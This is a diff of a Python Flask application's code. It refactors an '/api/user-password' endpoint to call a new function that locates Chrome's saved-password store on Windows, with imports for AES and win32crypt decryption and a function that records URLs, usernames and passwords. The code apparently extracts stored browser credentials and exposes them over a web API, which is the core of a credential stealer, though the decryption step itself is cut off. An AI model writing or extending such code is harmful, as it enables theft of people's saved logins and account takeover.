@@ -7,12 +7,12 @@ import os
 from Cryptodome.Cipher import AES
 import json
 import base64
-import win32crypt
 import re
 import csv
 import shutil
 import time
 import logging
+import platform
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -20,12 +20,12 @@ logger = logging.getLogger(__name__)
 
 # Conditionally import Windows modules
 if platform.system() == 'Windows':
-    try:
-        import win32crypt
-    except ImportError:
-        win32crypt = None
-else:
-    win32crypt = None
+    import win32crypt
+elif platform.system() == 'Linux':
+    import secretstorage
+    import binascii
+elif platform.system() == 'Darwin':  # macOS
+    import keyring
 
 # Load environment variables from .env file
 load_dotenv()
@@ -207,10 +207,23 @@ def add_user_data(id, url, username, password, timestamp):
 @app.route('/api/user-password', methods=['GET'])
 def user_password():
     try:
+        system = platform.system()
         
-        if win32crypt is None:
-            return jsonify({"error": "This feature requires Windows"}), 400
-    
+        if system == 'Windows':
+            return extract_windows_chrome_passwords()
+        elif system == 'Linux':
+            return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
+        elif system == 'Darwin':  # macOS
+            return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
+        else:
+            return jsonify({"error": f"Unsupported platform: {system}"}), 400
+            
+    except Exception as e:
+        logger.error(f"Unhandled exception in user_password: {str(e)}")
+        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
+
+def extract_windows_chrome_passwords():
+    try:
         
         CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
         CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
